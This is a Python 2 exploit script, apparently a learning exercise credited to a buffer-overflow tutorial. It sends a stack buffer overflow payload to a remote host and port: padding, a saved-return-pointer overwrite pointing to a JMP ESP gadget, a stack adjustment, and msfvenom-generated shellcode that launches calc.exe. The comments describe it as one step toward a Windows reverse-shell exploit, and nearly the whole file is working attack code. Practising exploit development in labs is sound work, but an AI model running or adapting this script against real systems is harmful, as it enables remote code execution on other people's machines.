#!/usr/bin/env python

# Uses opcode to pop calc as part of the process in developing a Windows x86
# reverse shell stack buffer overflow
# Saved Return Pointer overwrite exploit.
# Parameters are saved in params.py for persistence.
# Delete params.py and params.pyc to reset them; or simply edit params.py
#
# Written by y0k3L
# Credit to Justin Steven and his 'dostackbufferoverflowgood' tutorial
# https://github.com/justinsteven/dostackbufferoverflowgood

import struct, functions, subprocess

# get parameters
RHOST = functions.getRhost()
RPORT = functions.getRport()
buf_totlen = functions.getBufTotlen()
offset_srp = functions.getOffsetSrp()
ptr_jmp_esp = functions.getPtrJmpEsp()

print "RHOST=%s; RPORT=%s; buf_totlen=%s; offset_srp=%s; ptr_jmp_esp=%s" % (RHOST, RPORT, buf_totlen, offset_srp, hex(ptr_jmp_esp))

# instead of using NOPs, drag ESP up the stack to avoid GetPC issues
# note: when modifying ESP, always ensure that it remains divisible by 4
sub_esp_10 = "\x83\xec\x10"

# pop calc
# import shellcode from shellcode_calc.py; or create shellcode if not exists
try:
    import shellcode_calc
    print "shellcode_calc.py already exists - using that shellcode..."
except:
    badchars = [struct.pack("B", x).encode("hex") for x in functions.getBadChars()]
    # print badchars
    for x in range(0, len(badchars)):
        badchars[x] = '\\x' + badchars[x]
        # print a[x]
    # print badchars

    badcharsstr = "'" + ''.join(badchars) + "'"
    print "badcharsstr =", badcharsstr

    cmd = ["msfvenom", "-p", "windows/exec", "EXITFUNC=thread", "-v", "shellcode_calc", "-b", badcharsstr, "-f", "python", "CMD=calc.exe", "-o", "shellcode_calc.py"]

    print ' '.join(cmd)

    try:
        subprocess.check_output(cmd)
        import shellcode_calc

    except:
        print "Error generating shellcode :("
        exit()

buf = ""
buf += "A" * (offset_srp - len(buf))    # padding
buf += struct.pack("<I", ptr_jmp_esp)   # SRP overwrite
buf += sub_esp_10                       # ESP points here
buf += shellcode_calc.shellcode_calc
buf += "D" * (buf_totlen - len(buf))    # trailing padding
buf += "\n"

# print buf

sent = functions.sendBuffer(RHOST, RPORT, buf)

if sent is 0:
    print "Calc popped???"
